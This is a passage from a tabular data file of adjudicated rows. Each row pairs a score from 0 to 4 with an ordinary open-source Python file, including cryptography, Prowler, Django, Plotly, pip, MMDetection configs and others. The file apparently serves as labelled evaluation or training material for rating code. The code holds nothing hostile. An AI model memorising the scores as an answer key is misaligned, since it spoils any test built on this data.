    ctx = backend._lib.EVP_PKEY_CTX_new(evp_pkey, backend._ffi.NULL)
    backend.openssl_assert(ctx != backend._ffi.NULL)
    ctx = backend._ffi.gc(ctx, backend._lib.EVP_PKEY_CTX_free)
    res = backend._lib.EVP_PKEY_derive_init(ctx)
    backend.openssl_assert(res == 1)
    res = backend._lib.EVP_PKEY_derive_set_peer(ctx, peer_public_key._evp_pkey)
    if res != 1:
        errors_with_text = backend._consume_errors_with_text()
        raise ValueError(""Error computing shared key."", errors_with_text)

    keylen = backend._ffi.new(""size_t *"")
    res = backend._lib.EVP_PKEY_derive(ctx, backend._ffi.NULL, keylen)
    backend.openssl_assert(res == 1)
    backend.openssl_assert(keylen[0] > 0)
    buf = backend._ffi.new(""unsigned char[]"", keylen[0])
    res = backend._lib.EVP_PKEY_derive(ctx, buf, keylen)
    if res != 1:
        errors_with_text = backend._consume_errors_with_text()
        raise ValueError(""Error computing shared key."", errors_with_text)

    return backend._ffi.buffer(buf, keylen[0])[:]


def _calculate_digest_and_algorithm(
    data: bytes,
    algorithm: typing.Union[Prehashed, hashes.HashAlgorithm],
) -> typing.Tuple[bytes, hashes.HashAlgorithm]:
    if not isinstance(algorithm, Prehashed):
        hash_ctx = hashes.Hash(algorithm)
        hash_ctx.update(data)
        data = hash_ctx.finalize()
    else:
        algorithm = algorithm._algorithm

    if len(data) != algorithm.digest_size:
        raise ValueError(
            ""The provided data must be the same length as the hash ""
            ""algorithm's digest size.""
        )

    return (data, algorithm)"
274	adjudicated	0	"import threading
from dataclasses import dataclass

from prowler.lib.logger import logger
from prowler.providers.aws.aws_provider import generate_regional_clients


################## Macie
class Macie:
    def __init__(self, audit_info):
        self.service = ""macie2""
        self.session = audit_info.audit_session
        self.audited_account = audit_info.audited_account
        self.regional_clients = generate_regional_clients(self.service, audit_info)
        self.sessions = []
        self.__threading_call__(self.__get_macie_session__)

    def __get_session__(self):
        return self.session

    def __threading_call__(self, call):
        threads = []
        for regional_client in self.regional_clients.values():
            threads.append(threading.Thread(target=call, args=(regional_client,)))
        for t in threads:
            t.start()
        for t in threads:
            t.join()

    def __get_macie_session__(self, regional_client):
        logger.info(""Macie - Get Macie Session..."")
        try:
            self.sessions.append(
                Session(
                    regional_client.get_macie_session()[""status""],
                    regional_client.region,
                )
            )

        except Exception as error:
            if ""Macie is not enabled"" in str(error):
                self.sessions.append(
                    Session(
                        ""DISABLED"",
                        regional_client.region,
                    )
                )
            else:
                logger.error(
                    f""{regional_client.region} -- {error.__class__.__name__}[{error.__traceback__.tb_lineno}]: {error}""
                )


@dataclass
class Session:
    status: str
    region: str

    def __init__(
        self,
        status,
        region,
    ):
        self.status = status
        self.region = region"
56	adjudicated	4	"import re

from ._functools import method_cache


# from jaraco.text 3.5
class FoldedCase(str):
    """"""
    A case insensitive string class; behaves just like str
    except compares equal when the only variation is case.

    >>> s = FoldedCase('hello world')

    >>> s == 'Hello World'
    True

    >>> 'Hello World' == s
    True

    >>> s != 'Hello World'
    False

    >>> s.index('O')
    4

    >>> s.split('O')
    ['hell', ' w', 'rld']

    >>> sorted(map(FoldedCase, ['GAMMA', 'alpha', 'Beta']))
    ['alpha', 'Beta', 'GAMMA']

    Sequence membership is straightforward.

    >>> ""Hello World"" in [s]
    True
    >>> s in [""Hello World""]
    True

    You may test for set inclusion, but candidate and elements
    must both be folded.

    >>> FoldedCase(""Hello World"") in {s}
    True
    >>> s in {FoldedCase(""Hello World"")}
    True

    String inclusion works as long as the FoldedCase object
    is on the right.

    >>> ""hello"" in FoldedCase(""Hello World"")
    True

    But not if the FoldedCase object is on the left:

    >>> FoldedCase('hello') in 'Hello World'
    False

    In that case, use in_:

    >>> FoldedCase('hello').in_('Hello World')
    True

    >>> FoldedCase('hello') > FoldedCase('Hello')
    False
    """"""

    def __lt__(self, other):
        return self.lower() < other.lower()

    def __gt__(self, other):
        return self.lower() > other.lower()

    def __eq__(self, other):
        return self.lower() == other.lower()

    def __ne__(self, other):
        return self.lower() != other.lower()

    def __hash__(self):
        return hash(self.lower())

    def __contains__(self, other):
        return super().lower().__contains__(other.lower())

    def in_(self, other):
        ""Does self appear in other?""
        return self in FoldedCase(other)

    # cache lower since it's likely to be called frequently.
    @method_cache
    def lower(self):
        return super().lower()

    def index(self, sub):
        return self.lower().index(sub.lower())

    def split(self, splitter=' ', maxsplit=0):
        pattern = re.compile(re.escape(splitter), re.I)
        return pattern.split(self, maxsplit)"
287	adjudicated	0	"_base_ = [
    '../_base_/datasets/coco_detection.py',
    '../_base_/schedules/schedule_1x.py', '../_base_/default_runtime.py'
]
model = dict(
    type='ATSS',
    backbone=dict(
        type='ResNet',
        depth=50,
        num_stages=4,
        out_indices=(0, 1, 2, 3),
        frozen_stages=1,
        norm_cfg=dict(type='BN', requires_grad=True),
        norm_eval=True,
        style='pytorch',
        init_cfg=dict(type='Pretrained', checkpoint='torchvision://resnet50')),
    neck=[
        dict(
            type='FPN',
            in_channels=[256, 512, 1024, 2048],
            out_channels=256,
            start_level=1,
            add_extra_convs='on_output',
            num_outs=5),
        dict(type='DyHead', in_channels=256, out_channels=256, num_blocks=6)
    ],
    bbox_head=dict(
        type='ATSSHead',
        num_classes=80,
        in_channels=256,
        stacked_convs=0,
        feat_channels=256,
        anchor_generator=dict(
            type='AnchorGenerator',
            ratios=[1.0],
            octave_base_scale=8,
            scales_per_octave=1,
            strides=[8, 16, 32, 64, 128]),
        bbox_coder=dict(
            type='DeltaXYWHBBoxCoder',
            target_means=[.0, .0, .0, .0],
            target_stds=[0.1, 0.1, 0.2, 0.2]),
        loss_cls=dict(
            type='FocalLoss',
            use_sigmoid=True,
            gamma=2.0,
            alpha=0.25,
            loss_weight=1.0),
        loss_bbox=dict(type='GIoULoss', loss_weight=2.0),
        loss_centerness=dict(
            type='CrossEntropyLoss', use_sigmoid=True, loss_weight=1.0)),
    # training and testing settings
    train_cfg=dict(
        assigner=dict(type='ATSSAssigner', topk=9),
        allowed_border=-1,
        pos_weight=-1,
        debug=False),
    test_cfg=dict(
        nms_pre=1000,
        min_bbox_size=0,
        score_thr=0.05,
        nms=dict(type='nms', iou_threshold=0.6),
        max_per_img=100))
# optimizer
optimizer = dict(type='SGD', lr=0.01, momentum=0.9, weight_decay=0.0001)"
116	adjudicated	2	"import _plotly_utils.basevalidators


class TextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""textfont"", parent_name=""scatter"", **kwargs):
        super(TextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Textfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
396	adjudicated	0	"# Generated by Django 3.2.18 on 2023-03-09 11:26

from django.db import migrations, models
import django.db.models.deletion
import multiselectfield.db.fields


class Migration(migrations.Migration):

    initial = True

    dependencies = [
    ]

    operations = [
        migrations.CreateModel(
            name='Event',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('event_name', models.CharField(max_length=200, unique=True)),
                ('event_date', models.DateField()),
                ('event_time', models.TimeField()),
                ('created_on', models.DateTimeField(auto_now_add=True)),
            ],
        ),
        migrations.CreateModel(
            name='Guest',
            fields=[
                ('id', models.BigAutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('guest_name', models.CharField(max_length=200, unique=True)),
                ('slug', models.SlugField(max_length=200, unique=True)),
                ('email', models.EmailField(max_length=254)),
                ('is_attending', models.BooleanField(choices=[(False, 'No'), (True, 'Yes')], default='', verbose_name='Attending?')),
                ('message', models.TextField(blank=True)),
                ('dietary_requirements', multiselectfield.db.fields.MultiSelectField(choices=[(1, 'none'), (2, 'coeliac'), (3, 'food allergy'), (4, 'food intolerance'), (5, 'vegetarian'), (6, 'vegan'), (7, 'pescatarian'), (8, 'teetotal')], max_length=15)),
                ('plus_one_attending', models.BooleanField(choices=[(False, 'No'), (True, 'Yes')], default='', verbose_name='Attending?')),
                ('invited', models.IntegerField(choices=[(0, 'Draft'), (1, 'Invited')], default=0)),
                ('event', models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, related_name='guests', to='weddingapp.event')),
            ],
            options={
                'ordering': ['-guest_name'],
            },
        ),
    ]"
7	adjudicated	4	"# Copyright 2009-2022 Joshua Bronson. All rights reserved.
#
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.


#                             * Code review nav *
#                        (see comments in __init__.py)
#==============================================================================
# â Prev: _base.py          Current: _frozenbidict.py       Next: _bidict.py â
#==============================================================================

""""""Provide :class:`frozenbidict`, an immutable, hashable bidirectional mapping type.""""""

import typing as t

from ._base import BidictBase
from ._typing import KT, VT


class frozenbidict(BidictBase[KT, VT]):
    """"""Immutable, hashable bidict type.""""""

    _hash: int

    # Work around lack of support for higher-kinded types in Python.
    # Ref: https://github.com/python/typing/issues/548#issuecomment-621571821
    if t.TYPE_CHECKING:
        @property
        def inverse(self) -> 'frozenbidict[VT, KT]': ...

    def __hash__(self) -> int:
        """"""The hash of this bidict as determined by its items.""""""
        if getattr(self, '_hash', None) is None:
            # The following is like hash(frozenset(self.items()))
            # but more memory efficient. See also: https://bugs.python.org/issue46684
            self._hash = t.ItemsView(self)._hash()  # type: ignore [attr-defined]  # https://github.com/python/typeshed/pull/7153
        return self._hash


#                             * Code review nav *
#==============================================================================
# â Prev: _base.py          Current: _frozenbidict.py       Next: _bidict.py â
#=============================================================================="
489	adjudicated	3	"from django.contrib.messages.storage.base import BaseStorage
from django.contrib.messages.storage.cookie import CookieStorage
from django.contrib.messages.storage.session import SessionStorage


class FallbackStorage(BaseStorage):
    """"""
    Try to store all messages in the first backend. Store any unstored
    messages in each subsequent backend.
    """"""
    storage_classes = (CookieStorage, SessionStorage)

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.storages = [storage_class(*args, **kwargs)
                         for storage_class in self.storage_classes]
        self._used_storages = set()

    def _get(self, *args, **kwargs):
        """"""
        Get a single list of messages from all storage backends.
        """"""
        all_messages = []
        for storage in self.storages:
            messages, all_retrieved = storage._get()
            # If the backend hasn't been used, no more retrieval is necessary.
            if messages is None:
                break
            if messages:
                self._used_storages.add(storage)
            all_messages.extend(messages)
            # If this storage class contained all the messages, no further
            # retrieval is necessary
            if all_retrieved:
                break
        return all_messages, all_retrieved

    def _store(self, messages, response, *args, **kwargs):
        """"""
        Store the messages and return any unstored messages after trying all
        backends.

        For each storage backend, any messages not stored are passed on to the
        next backend.
        """"""
        for storage in self.storages:
            if messages:
                messages = storage._store(messages, response, remove_oldest=False)
            # Even if there are no more messages, continue iterating to ensure
            # storages which contained messages are flushed.
            elif storage in self._used_storages:
                storage._store([], response)
                self._used_storages.remove(storage)
        return messages"
499	adjudicated	4	"""""""Object Utilities.""""""
from __future__ import absolute_import, unicode_literals


class cached_property(object):
    """"""Cached property descriptor.

    Caches the return value of the get method on first call.

    Examples:
        .. code-block:: python

            @cached_property
            def connection(self):
                return Connection()

            @connection.setter  # Prepares stored value
            def connection(self, value):
                if value is None:
                    raise TypeError('Connection must be a connection')
                return value

            @connection.deleter
            def connection(self, value):
                # Additional action to do at del(self.attr)
                if value is not None:
                    print('Connection {0!r} deleted'.format(value)
    """"""

    def __init__(self, fget=None, fset=None, fdel=None, doc=None):
        self.__get = fget
        self.__set = fset
        self.__del = fdel
        self.__doc__ = doc or fget.__doc__
        self.__name__ = fget.__name__
        self.__module__ = fget.__module__

    def __get__(self, obj, type=None):
        if obj is None:
            return self
        try:
            return obj.__dict__[self.__name__]
        except KeyError:
            value = obj.__dict__[self.__name__] = self.__get(obj)
            return value

    def __set__(self, obj, value):
        if obj is None:
            return self
        if self.__set is not None:
            value = self.__set(obj, value)
        obj.__dict__[self.__name__] = value

    def __delete__(self, obj, _sentinel=object()):
        if obj is None:
            return self
        value = obj.__dict__.pop(self.__name__, _sentinel)
        if self.__del is not None and value is not _sentinel:
            self.__del(obj, value)

    def setter(self, fset):
        return self.__class__(self.__get, fset, self.__del)

    def deleter(self, fdel):
        return self.__class__(self.__get, self.__set, fdel)"
157	adjudicated	2	"""""""HTTP cache implementation.
""""""

import os
from contextlib import contextmanager
from typing import Generator, Optional

from pip._vendor.cachecontrol.cache import BaseCache
from pip._vendor.cachecontrol.caches import FileCache
from pip._vendor.requests.models import Response

from pip._internal.utils.filesystem import adjacent_tmp_file, replace
from pip._internal.utils.misc import ensure_dir


def is_from_cache(response: Response) -> bool:
    return getattr(response, ""from_cache"", False)


@contextmanager
def suppressed_cache_errors() -> Generator[None, None, None]:
    """"""If we can't access the cache then we can just skip caching and process
    requests as if caching wasn't enabled.
    """"""
    try:
        yield
    except OSError:
        pass


class SafeFileCache(BaseCache):
    """"""
    A file based cache which is safe to use even when the target directory may
    not be accessible or writable.
    """"""

    def __init__(self, directory: str) -> None:
        assert directory is not None, ""Cache directory must not be None.""
        super().__init__()
        self.directory = directory

    def _get_cache_path(self, name: str) -> str:
        # From cachecontrol.caches.file_cache.FileCache._fn, brought into our
        # class for backwards-compatibility and to avoid using a non-public
        # method.
        hashed = FileCache.encode(name)
        parts = list(hashed[:5]) + [hashed]
        return os.path.join(self.directory, *parts)

    def get(self, key: str) -> Optional[bytes]:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            with open(path, ""rb"") as f:
                return f.read()

    def set(self, key: str, value: bytes, expires: Optional[int] = None) -> None:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            ensure_dir(os.path.dirname(path))

            with adjacent_tmp_file(path) as f:
                f.write(value)

            replace(f.name, path)

    def delete(self, key: str) -> None:
        path = self._get_cache_path(key)
        with suppressed_cache_errors():
            os.remove(path)"
17	adjudicated	2	"# model settings
model = dict(
    type='RPN',
    backbone=dict(
        type='ResNet',
        depth=50,
        num_stages=3,
        strides=(1, 2, 2),
        dilations=(1, 1, 1),
        out_indices=(2, ),
        frozen_stages=1,
        norm_cfg=dict(type='BN', requires_grad=False),
        norm_eval=True,
        style='caffe',
        init_cfg=dict(
            type='Pretrained',
            checkpoint='open-mmlab://detectron2/resnet50_caffe')),
    neck=None,
    rpn_head=dict(
        type='RPNHead',
        in_channels=1024,
        feat_channels=1024,
        anchor_generator=dict(
            type='AnchorGenerator',
            scales=[2, 4, 8, 16, 32],
            ratios=[0.5, 1.0, 2.0],
            strides=[16]),
        bbox_coder=dict(
            type='DeltaXYWHBBoxCoder',
            target_means=[.0, .0, .0, .0],
            target_stds=[1.0, 1.0, 1.0, 1.0]),
        loss_cls=dict(
            type='CrossEntropyLoss', use_sigmoid=True, loss_weight=1.0),
        loss_bbox=dict(type='L1Loss', loss_weight=1.0)),
    # model training and testing settings
    train_cfg=dict(
        rpn=dict(
            assigner=dict(
                type='MaxIoUAssigner',
                pos_iou_thr=0.7,
                neg_iou_thr=0.3,
                min_pos_iou=0.3,
                ignore_iof_thr=-1),
            sampler=dict(
                type='RandomSampler',
                num=256,
                pos_fraction=0.5,
                neg_pos_ub=-1,
                add_gt_as_proposals=False),
            allowed_border=0,
            pos_weight=-1,
            debug=False)),
    test_cfg=dict(
        rpn=dict(
            nms_pre=12000,
            max_per_img=2000,
            nms=dict(type='nms', iou_threshold=0.7),
            min_bbox_size=0)))"
386	adjudicated	2	"""""""
rest_framework.schemas

schemas:
    __init__.py
    generators.py   # Top-down schema generation
    inspectors.py   # Per-endpoint view introspection
    utils.py        # Shared helper functions
    views.py        # Houses `SchemaView`, `APIView` subclass.

We expose a minimal ""public"" API directly from `schemas`. This covers the
basic use-cases:

    from rest_framework.schemas import (
        AutoSchema,
        ManualSchema,
        get_schema_view,
        SchemaGenerator,
    )

Other access should target the submodules directly
""""""
from rest_framework.settings import api_settings

from . import coreapi, openapi
from .coreapi import AutoSchema, ManualSchema, SchemaGenerator  # noqa
from .inspectors import DefaultSchema  # noqa


def get_schema_view(
    title=None,
    url=None,
    description=None,
    urlconf=None,
    renderer_classes=None,
    public=False,
    patterns=None,
    generator_class=None,
    authentication_classes=api_settings.DEFAULT_AUTHENTICATION_CLASSES,
    permission_classes=api_settings.DEFAULT_PERMISSION_CLASSES,
    version=None,
):
    """"""
    Return a schema view.
    """"""
    if generator_class is None:
        if coreapi.is_enabled():
            generator_class = coreapi.SchemaGenerator
        else:
            generator_class = openapi.SchemaGenerator

    generator = generator_class(
        title=title,
        url=url,
        description=description,
        urlconf=urlconf,
        patterns=patterns,
        version=version,
    )

    # Avoid import cycle on APIView
    from .views import SchemaView

    return SchemaView.as_view(
        renderer_classes=renderer_classes,
        schema_generator=generator,
        public=public,
        authentication_classes=authentication_classes,
        permission_classes=permission_classes,
    )"
106	adjudicated	4	"""""""rope refactor package

This package contains modules that perform python refactorings.
Refactoring classes perform refactorings in 4 steps:

1. Collect some data for performing the refactoring and use them
   to construct a refactoring class.  Like::

     renamer = Rename(project, resource, offset)

2. Some refactorings give you useful information about the
   refactoring after their construction.  Like::

     print(renamer.get_old_name())

3. Give the refactoring class more information about how to
   perform the refactoring and get the changes this refactoring is
   going to make.  This is done by calling `get_changes` method of the
   refactoring class.  Like::

     changes = renamer.get_changes(new_name)

4. You can commit the changes.  Like::

     project.do(changes)

These steps are like the steps IDEs usually do for performing a
refactoring.  These are the things an IDE does in each step:

1. Construct a refactoring object by giving it information like
   resource, offset and ... .  Some of the refactoring problems (like
   performing rename refactoring on language keywords) can be reported
   here.
2. Print some information about the refactoring and ask the user
   about the information that are necessary for completing the
   refactoring (like new name).
3. Call the `get_changes` by passing it information asked from
   the user (if necessary) and get and preview the changes returned by
   it.
4. perform the refactoring.

From ``0.5m5`` release the `get_changes()` method of some time-
consuming refactorings take an optional `rope.base.taskhandle.
TaskHandle` parameter.  You can use this object for stopping or
monitoring the progress of refactorings.

""""""
from rope.refactor.importutils import ImportOrganizer  # noqa
from rope.refactor.topackage import ModuleToPackage  # noqa

__all__ = [
    ""rename"",
    ""move"",
    ""inline"",
    ""extract"",
    ""restructure"",
    ""topackage"",
    ""importutils"",
    ""usefunction"",
    ""change_signature"",
    ""encapsulate_field"",
    ""introduce_factory"",
    ""introduce_parameter"",
    ""localtofield"",
    ""method_object"",
    ""multiproject"",
]"
297	adjudicated	0	"#  Copyright 2022 Google LLC
#
#  Licensed under the Apache License, Version 2.0 (the ""License"");
#  you may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an ""AS IS"" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.
import uuid


import google.auth
from google.cloud import batch_v1
from google.cloud import storage
import pytest

from .test_basics import _test_body
from ..create.create_with_mounted_bucket import create_script_job_with_bucket

PROJECT = google.auth.default()[1]
REGION = 'europe-north1'

TIMEOUT = 600  # 10 minutes

WAIT_STATES = {
    batch_v1.JobStatus.State.STATE_UNSPECIFIED,
    batch_v1.JobStatus.State.QUEUED,
    batch_v1.JobStatus.State.RUNNING,
    batch_v1.JobStatus.State.SCHEDULED,
}


@pytest.fixture
def job_name():
    return f""test-job-{uuid.uuid4().hex[:10]}""


@pytest.fixture()
def test_bucket():
    bucket_name = f""test-bucket-{uuid.uuid4().hex[:8]}""
    client = storage.Client()
    client.create_bucket(bucket_name, location=""eu"")

    yield bucket_name

    bucket = client.get_bucket(bucket_name)
    bucket.delete(force=True)


def _test_bucket_content(test_bucket):
    client = storage.Client()
    bucket = client.get_bucket(test_bucket)

    file_name_template = ""output_task_{task_number}.txt""
    file_content_template = ""Hello world from task {task_number}.\n""

    for i in range(4):
        blob = bucket.blob(file_name_template.format(task_number=i))
        content = blob.download_as_bytes().decode()
        assert content == file_content_template.format(task_number=i)


def test_bucket_job(job_name, test_bucket):
    job = create_script_job_with_bucket(PROJECT, REGION, job_name, test_bucket)
    _test_body(job, lambda: _test_bucket_content(test_bucket))"
46	adjudicated	2	"#
# Copyright 2017 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

""""""
Some docker related convenience functions
""""""
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

import os
import socket
from structlog import get_logger

from docker import Client, errors


docker_socket = os.environ.get('DOCKER_SOCK', 'unix://tmp/docker.sock')
log = get_logger()

def get_my_containers_name():
    """"""
    Return the docker containers name in which this process is running.
    To look up the container name, we use the container ID extracted from the
    $HOSTNAME environment variable (which is set by docker conventions).
    :return: String with the docker container name (or None if any issue is
             encountered)
    """"""
    my_container_id = os.environ.get('HOSTNAME', None)

    try:
        docker_cli = Client(base_url=docker_socket)
        info = docker_cli.inspect_container(my_container_id)

    except Exception, e:
        log.exception('failed', my_container_id=my_container_id, e=e)
        raise

    name = info['Name'].lstrip('/')

    return name

def get_all_running_containers():
    try:
        docker_cli = Client(base_url=docker_socket)
        containers = docker_cli.containers()

    except Exception, e:
        log.exception('failed', e=e)
        raise

    return containers

def inspect_container(id):
    try:
        docker_cli = Client(base_url=docker_socket)
        info = docker_cli.inspect_container(id)
    except Exception, e:
        log.exception('failed-inspect-container', id=id, e=e)
        raise

    return info
"
264	adjudicated	1	"# automatically generated by the FlatBuffers compiler, do not modify

# namespace: proto

import flatbuffers
from flatbuffers.compat import import_numpy
np = import_numpy()

class RouterRoles(object):
    __slots__ = ['_tab']

    @classmethod
    def GetRootAs(cls, buf, offset=0):
        n = flatbuffers.encode.Get(flatbuffers.packer.uoffset, buf, offset)
        x = RouterRoles()
        x.Init(buf, n + offset)
        return x

    @classmethod
    def GetRootAsRouterRoles(cls, buf, offset=0):
        """"""This method is deprecated. Please switch to GetRootAs.""""""
        return cls.GetRootAs(buf, offset)
    # RouterRoles
    def Init(self, buf, pos):
        self._tab = flatbuffers.table.Table(buf, pos)

    # RouterRoles
    def Broker(self):
        o = flatbuffers.number_types.UOffsetTFlags.py_type(self._tab.Offset(4))
        if o != 0:
            x = self._tab.Indirect(o + self._tab.Pos)
            from wamp.proto.BrokerFeatures import BrokerFeatures
            obj = BrokerFeatures()
            obj.Init(self._tab.Bytes, x)
            return obj
        return None

    # RouterRoles
    def Dealer(self):
        o = flatbuffers.number_types.UOffsetTFlags.py_type(self._tab.Offset(6))
        if o != 0:
            x = self._tab.Indirect(o + self._tab.Pos)
            from wamp.proto.DealerFeatures import DealerFeatures
            obj = DealerFeatures()
            obj.Init(self._tab.Bytes, x)
            return obj
        return None

def RouterRolesStart(builder): builder.StartObject(2)
def Start(builder):
    return RouterRolesStart(builder)
def RouterRolesAddBroker(builder, broker): builder.PrependUOffsetTRelativeSlot(0, flatbuffers.number_types.UOffsetTFlags.py_type(broker), 0)
def AddBroker(builder, broker):
    return RouterRolesAddBroker(builder, broker)
def RouterRolesAddDealer(builder, dealer): builder.PrependUOffsetTRelativeSlot(1, flatbuffers.number_types.UOffsetTFlags.py_type(dealer), 0)
def AddDealer(builder, dealer):
    return RouterRolesAddDealer(builder, dealer)
def RouterRolesEnd(builder): return builder.EndObject()
def End(builder):
    return RouterRolesEnd(builder)"
324	adjudicated	0	"from urllib.parse import parse_qsl, unquote, urlparse, urlunparse

from django import template
from django.contrib.admin.utils import quote
from django.urls import Resolver404, get_script_prefix, resolve
from django.utils.http import urlencode

register = template.Library()


@register.filter
def admin_urlname(value, arg):
    return 'admin:%s_%s_%s' % (value.app_label, value.model_name, arg)


@register.filter
def admin_urlquote(value):
    return quote(value)


@register.simple_tag(takes_context=True)
def add_preserved_filters(context, url, popup=False, to_field=None):
    opts = context.get('opts')
    preserved_filters = context.get('preserved_filters')

    parsed_url = list(urlparse(url))
    parsed_qs = dict(parse_qsl(parsed_url[4]))
    merged_qs = {}

    if opts and preserved_filters:
        preserved_filters = dict(parse_qsl(preserved_filters))

        match_url = '/%s' % unquote(url).partition(get_script_prefix())[2]
        try:
            match = resolve(match_url)
        except Resolver404:
            pass
        else:
            current_url = '%s:%s' % (match.app_name, match.url_name)
            changelist_url = 'admin:%s_%s_changelist' % (opts.app_label, opts.model_name)
            if changelist_url == current_url and '_changelist_filters' in preserved_filters:
                preserved_filters = dict(parse_qsl(preserved_filters['_changelist_filters']))

        merged_qs.update(preserved_filters)

    if popup:
        from django.contrib.admin.options import IS_POPUP_VAR
        merged_qs[IS_POPUP_VAR] = 1
    if to_field:
        from django.contrib.admin.options import TO_FIELD_VAR
        merged_qs[TO_FIELD_VAR] = to_field

    merged_qs.update(parsed_qs)

    parsed_url[4] = urlencode(merged_qs)
    return urlunparse(parsed_url)"
235	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""scatterpolargl.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
375	adjudicated	2	"#
# The Python Imaging Library.
# $Id$
#
# Binary input/output support routines.
#
# Copyright (c) 1997-2003 by Secret Labs AB
# Copyright (c) 1995-2003 by Fredrik Lundh
# Copyright (c) 2012 by Brian Crowell
#
# See the README file for information on usage and redistribution.
#


""""""Binary input/output support routines.""""""


from struct import pack, unpack_from


def i8(c):
    return c if c.__class__ is int else c[0]


def o8(i):
    return bytes((i & 255,))


# Input, le = little endian, be = big endian
def i16le(c, o=0):
    """"""
    Converts a 2-bytes (16 bits) string to an unsigned integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<H"", c, o)[0]


def si16le(c, o=0):
    """"""
    Converts a 2-bytes (16 bits) string to a signed integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<h"", c, o)[0]


def si16be(c, o=0):
    """"""
    Converts a 2-bytes (16 bits) string to a signed integer, big endian.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from("">h"", c, o)[0]


def i32le(c, o=0):
    """"""
    Converts a 4-bytes (32 bits) string to an unsigned integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<I"", c, o)[0]


def si32le(c, o=0):
    """"""
    Converts a 4-bytes (32 bits) string to a signed integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<i"", c, o)[0]


def i16be(c, o=0):
    return unpack_from("">H"", c, o)[0]


def i32be(c, o=0):
    return unpack_from("">I"", c, o)[0]


# Output, le = little endian, be = big endian
def o16le(i):
    return pack(""<H"", i)


def o32le(i):
    return pack(""<I"", i)


def o16be(i):
    return pack("">H"", i)


def o32be(i):
    return pack("">I"", i)"
72	adjudicated	4	"#
# Copyright 2018 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
from voltha.extensions.omci.tasks.get_mds_task import GetMdsTask


class AdtnGetMdsTask(GetMdsTask):
    """"""
    OpenOMCI Get MIB Data Sync value task - Adtran ONU

    On successful completion, this task will call the 'callback' method of the
    deferred returned by the start method and return the value of the MIB
    Data Sync attribute of the ONT Data ME
    """"""
    name = ""ADTN: Get MDS Task""

    def __init__(self, omci_agent, device_id):
        """"""
        Class initialization

